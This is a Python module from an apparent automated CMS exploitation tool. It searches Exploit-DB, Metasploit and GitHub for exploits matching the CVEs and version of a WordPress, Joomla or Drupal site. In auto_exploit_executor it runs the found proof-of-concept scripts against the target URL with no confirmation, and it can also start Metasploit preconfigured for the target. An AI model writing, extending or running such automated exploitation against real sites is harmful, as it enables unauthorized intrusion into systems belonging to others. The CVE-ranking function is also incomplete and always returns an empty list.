import subprocess
import requests
import os
import re
import json
from logger import logger
from bs4 import BeautifulSoup
from colorama import Fore, Style
from packaging import version as pkg_version


def run_auto_exploit(cms, version, cves, target_ip, target_url, plugins_themes=[]):
    print(f"\n{Fore.LIGHTMAGENTA_EX}[INFO] Checking for available exploits for {cms} (Version: {version})...")

    found_exploits_cve = []
    found_exploits_combo_exact = []
    found_exploits_combo_partial = []
    github_links_all = []
    metasploit_modules_cve = []
    metasploit_modules_exact = []
    metasploit_modules_partial = []

    # --- CVE-based exploits ---
    for cve in cves:
        cve_id = cve["id"]
        description = cve["description"]
        has_exploit = False

        # SearchSploit
        try:
            result = subprocess.run(["searchsploit", "-w", cve_id], stdout=subprocess.PIPE, text=True)
            if "No Results" not in result.stdout:
                path_lines = [line for line in result.stdout.splitlines() if "https://" in line]
                found_exploits_cve.append({
                    "cve": cve_id,
                    "description": description,
                    "source": "Exploit-DB",
                    "details": result.stdout.strip(),
                    "path_lines": path_lines
                })
                has_exploit = True
        except Exception as e:
            logger.error(f"SearchSploit error for {cve_id}: {e}")

        # Metasploit by CVE
        try:
            result = subprocess.run(["msfconsole", "-q", "-x", f"search cve:{cve_id}; exit"],
                                    stdout=subprocess.PIPE, text=True)
            if "Matching Modules" in result.stdout or cve_id in result.stdout:
                modules = extract_metasploit_modules(result.stdout, cms)
                for m in modules:
                    if m not in metasploit_modules_cve:
                        metasploit_modules_cve.append(m)
                has_exploit = True
        except Exception as e:
            logger.error(f"Metasploit CVE search error: {e}")

        # GitHub PoCs
        gh_links = search_github_exploit(cve_id)
        if gh_links:
            github_links_all.append({
                "cve": cve_id,
                "description": description,
                "links": gh_links
            })

        if not has_exploit:
            logger.warning(f"No automated exploit found for {cve_id}")

    # --- SearchSploit: CMS + version (all levels) ---
    combo_versions = []
    version_parts = version.strip().split(".")
    for i in range(len(version_parts), 0, -1):
        combo_versions.append(".".join(version_parts[:i]))

    for v in combo_versions:
        for keyword in [f"{cms} {v}"] + [f"{cms} {v} {item}" for item in plugins_themes]:
            try:
                result = subprocess.run(["searchsploit", "-w", keyword], stdout=subprocess.PIPE, text=True)
                if "No Results" not in result.stdout:
                    lines = result.stdout.splitlines()
                    filtered = [line for line in lines if is_relevant_searchsploit_line(line, cms, combo_versions)]
                    if filtered:
                        entry = {
                            "query": keyword,
                            "version": v,
                            "source": "Exploit-DB",
                            "details": "\n".join(filtered)
                        }
                        if v == version:
                            found_exploits_combo_exact.append(entry)
                        else:
                            found_exploits_combo_partial.append(entry)
            except Exception as e:
                logger.error(f"SearchSploit combo error for {keyword}: {e}")

    # --- Metasploit: CMS + version (all levels) ---
    for v in combo_versions:
        try:
            result = subprocess.run(["msfconsole", "-q", "-x", f"search {cms} {v}; exit"],
                                    stdout=subprocess.PIPE, text=True)
            if cms.lower() in result.stdout.lower():
                modules = extract_metasploit_modules(result.stdout, cms)
                for m in modules:
                    if m in metasploit_modules_cve or m in metasploit_modules_exact:
                        continue
                    if v == version:
                        metasploit_modules_exact.append(m)
                    elif m not in metasploit_modules_partial:
                        metasploit_modules_partial.append(m)
        except Exception as e:
            logger.error(f"Metasploit CMS+version search error for {v}: {e}")

    metasploit_modules_partial = [m for m in metasploit_modules_partial if m not in metasploit_modules_exact]

    # --- Rank CVEs with CVEMap ---
    ranked = rank_cves_with_cvemap(cves)
    if ranked:
        print(f"\n{Fore.LIGHTWHITE_EX}============================================================")
        print(f"[CVE Risk Ranking via CVEMap]")
        print(f"============================================================\n")
        print(f"{'RANK':<6} {'CVE ID':<18} {'ðŸ”¥EXP':<8} {'GH PoC':<6} {'Google Hits':<12} DESCRIPTION")
        print("-" * 90)
        for idx, r in enumerate(ranked, 1):
            exp_flag = f"{Fore.LIGHTRED_EX}ðŸ”¥ YES" if r["exploitable"] else f"{Fore.LIGHTBLACK_EX}No"
            print(f"{Fore.WHITE}{idx:<6} {r['id']:<18} {exp_flag:<8} "
                  f"{r['github']:<6} {r['google']:<12} "
                  f"{r['description'][:50]}{'...' if len(r['description']) > 50 else ''}")

    # --- Exploits by CVE ---
    if found_exploits_cve:
        print(f"\n{Fore.LIGHTWHITE_EX}============================================================")
        print(f"[Automatic Exploits Found (CVE-based)]")
        print(f"============================================================\n")
        for idx, item in enumerate(found_exploits_cve, 1):
            print(f"{Fore.LIGHTCYAN_EX}{idx}. [{item['cve']}] ({item['source']}) {item['description']}")
            print(f"{Fore.LIGHTBLACK_EX}{item['details']}\n")
            auto_exploit_executor(item, target_url)

    # --- Additional Exploits ---
    if found_exploits_combo_exact:
        print(f"\n{Fore.LIGHTWHITE_EX}============================================================")
        print(f"[Additional Exploits Found (Exact version match: {version})]")
        print(f"============================================================\n")
        for idx, item in enumerate(found_exploits_combo_exact, 1):
            print(f"{Fore.LIGHTCYAN_EX}{idx}. [{item['query']}] ({item['source']})")
            print(f"{Fore.LIGHTBLACK_EX}{item['details']}\n")

    if found_exploits_combo_partial:
        print(f"\n{Fore.LIGHTWHITE_EX}============================================================")
        print(f"[Additional Exploits Found (Partial version match)]")
        print(f"============================================================\n")
        for idx, item in enumerate(found_exploits_combo_partial, 1):
            print(f"{Fore.LIGHTCYAN_EX}{idx}. [{item['query']}] ({item['source']})")
            print(f"{Fore.LIGHTBLACK_EX}{item['details']}\n")

    # --- GitHub PoCs ---
    print(f"\n{Fore.LIGHTWHITE_EX}============================================================")
    print(f"[GitHub Tools / PoCs Found]")
    print(f"============================================================\n")
    if github_links_all:
        for idx, item in enumerate(github_links_all, 1):
            print(f"{Fore.LIGHTCYAN_EX}{idx}. [{item['cve']}] {item['description'][:100]}...")
            for link in item['links']:
                print(f"   {Fore.LIGHTBLUE_EX}- {link}")
            print()
    else:
        print(f"{Fore.YELLOW}[INFO] No GitHub links found for these CVEs.\n")

    # --- Metasploit Modules ---
    if metasploit_modules_cve:
        print(f"{Fore.LIGHTWHITE_EX}============================================================")
        print(f"[Metasploit Modules Found (by CVE)]")
        print(f"============================================================\n")
        for idx, module in enumerate(metasploit_modules_cve, 1):
            print(f"{Fore.LIGHTRED_EX}{idx}. {module}")

    if metasploit_modules_exact:
        print(f"\n{Fore.LIGHTWHITE_EX}============================================================")
        print(f"[Metasploit Modules Found (Exact version: {version})]")
        print(f"============================================================\n")
        for idx, module in enumerate(metasploit_modules_exact, 1):
            print(f"{Fore.LIGHTRED_EX}{idx}. {module}")

    if metasploit_modules_partial:
        print(f"\n{Fore.LIGHTWHITE_EX}============================================================")
        print(f"[Metasploit Modules Found (Partial version match)]")
        print(f"============================================================\n")
        for idx, module in enumerate(metasploit_modules_partial, 1):
            print(f"{Fore.LIGHTRED_EX}{idx}. {module}")

    all_msf = metasploit_modules_cve + metasploit_modules_exact + metasploit_modules_partial
    if all_msf:
        run_msf = input(f"\n{Fore.GREEN}[?] Do you want to launch Metasploit with these modules? (y/n): ").strip().lower()
        if run_msf == 'y':
            launch_metasploit(all_msf, target_ip, target_url)
    else:
        print(f"{Fore.LIGHTYELLOW_EX}[INFO] No Metasploit modules found.\n")


from colorama import Fore, Style

def rank_cves_with_cvemap(cves):
    """
    Run CVEMap for each CVE ID and parse table output per line.
    """
    go_bin_path = os.path.expanduser("~/go/bin/cvemap")

    print(f"\n{Fore.LIGHTWHITE_EX}============================================================")
    print(f"[CVEMap Summary Table]")
    print(f"============================================================\n")
    print(f"{Fore.LIGHTCYAN_EX}{'ID':<18} {'CVSS':<6} {'SEVERITY':<9} {'EPSS':<8} {'PRODUCT':<20} {'AGE':<6} {'TEMPLATE'}")
    print(f"{Fore.LIGHTBLACK_EX}{'-'*90}")

    for cve in cves:
        cve_id = cve["id"]
        try:
            result = subprocess.run(
                [go_bin_path, "-id", cve_id],
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                text=True,
                timeout=15
            )
            lines = result.stdout.splitlines()
            data_line = next((line for line in lines if line.strip().startswith(f"â”‚ {cve_id}")), None)

            if data_line:
                parts = [p.strip() for p in data_line.strip("â”‚").split("â”‚")]
                if len(parts) >= 7:
                    _, cvss, severity, epss, product, age, template = parts[:7]
                    template_mark = f"{Fore.GREEN}âœ“" if 'âœ“' in template else f"{Fore.RED}âœ˜"
                    print(f"{Fore.WHITE}{cve_id:<18} {cvss:<6} {severity:<9} {epss:<8} {product:<20} {age:<6} {template_mark}")
                else:
                    print(f"{Fore.YELLOW}[WARN] Malformed data line for {cve_id}")
            else:
                print(f"{Fore.YELLOW}[WARN] No data line found for {cve_id}")

        except Exception as e:
            print(f"{Fore.YELLOW}[WARN] Failed to run CVEMap for {cve_id}: {e}")

    print(Style.RESET_ALL)
    return []



def extract_metasploit_modules(msf_output, cms=None):
    modules = set()
    cms = cms.lower() if cms else ""

    cms_prefixes = {
        "wordpress": ["wp", "wordpress"],
        "joomla": ["joomla"],
        "drupal": ["drupal", "drupalgeddon", "drupageddon", "sa-core", "views", "restws", "openid"]
    }

    prefixes = cms_prefixes.get(cms, [])

    for line in msf_output.split('\n'):
        line = line.strip()
        if not line or line.startswith("Matching Modules") or line.startswith("===") or line.startswith("\\_"):
            continue

        match = re.search(r"(exploit|auxiliary)/[^\s]+", line)
        if match:
            module_path = match.group(0).lower()
            if cms == "drupal" and "xmlrpc" in module_path and "drupal" in line.lower():
                modules.add(match.group(0))
                continue
            if prefixes:
                if any(p in module_path for p in prefixes):
                    modules.add(match.group(0))
            else:
                modules.add(match.group(0))

    return sorted(modules)


def is_relevant_searchsploit_line(line, cms, version_parts):
    line_lower = line.lower()
    cms_lower = cms.lower()

    if cms_lower not in line_lower:
        return False

    for v in version_parts:
        pattern = rf"(?:\b|[-_/]){re.escape(v)}(?:\b|[-_/])"
        if re.search(pattern, line_lower):
            return True

    return False


def launch_metasploit(modules, target_ip, target_url):
    print(f"\n{Fore.CYAN}[*] Launching Metasploit with target: {target_ip}")
    print(f"{Fore.YELLOW}[*] Available commands:")
    print(f"  use <module>       - Select a module (e.g. use {modules[0]})")
    print(f"  show options       - Show module options")
    print(f"  set RHOSTS {target_ip}  - Set target IP")
    print(f"  set TARGETURI {target_url} - Set target URL path")
    print(f"  run                - Run the exploit")
    print(f"  back               - Go back to previous menu")
    print(f"  exit               - Exit Metasploit\n")
    rc_script = f"""
setg RHOSTS {target_ip}
setg TARGETURI {target_url}
"""
    rc_file = "/tmp/msf_auto.rc"
    with open(rc_file, 'w') as f:
        f.write(rc_script)
    try:
        subprocess.run(['msfconsole', '-q', '-r', rc_file])
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to launch Metasploit: {e}")
    finally:
        if os.path.exists(rc_file):
            os.remove(rc_file)


def search_github_exploit(cve_id):
    headers = {"User-Agent": "Mozilla/5.0"}
    search_url = f"https://github.com/search?q={cve_id}"
    try:
        response = requests.get(search_url, headers=headers, timeout=10)
        if response.status_code != 200:
            return []
        soup = BeautifulSoup(response.text, "html.parser")
        links = soup.find_all("a", href=True)
        return [f"https://github.com{a['href']}" for a in links if cve_id.lower() in a["href"].lower()][:5]
    except Exception as e:
        logger.error(f"GitHub search failed for {cve_id}: {e}")
        return []


def auto_exploit_executor(exploit_item, target_url):
    print(f"{Fore.LIGHTYELLOW_EX}[EXEC] Attempting exploitation for CVE {exploit_item.get('cve', 'N/A')}...")
    if "path_lines" in exploit_item:
        for line in exploit_item["path_lines"]:
            if any(ext in line for ext in [".py", ".php", ".pl"]):
                path = line.split("https://")[1].strip()
                local_path = "/usr/share/exploitdb/" + "/".join(path.split("/")[1:])
                if os.path.exists(local_path):
                    try:
                        cmd = ["python3", local_path] if local_path.endswith(".py") else \
                              ["php", local_path] if local_path.endswith(".php") else \
                              ["perl", local_path]
                        subprocess.run(cmd + [target_url])
                        print(f"{Fore.GREEN}[SUCCESS] Executed PoC: {local_path}")
                    except Exception as e:
                        print(f"{Fore.RED}[ERROR] Failed to execute {local_path}: {e}")
                else:
                    print(f"{Fore.YELLOW}[SKIP] PoC not found locally: {local_path}")
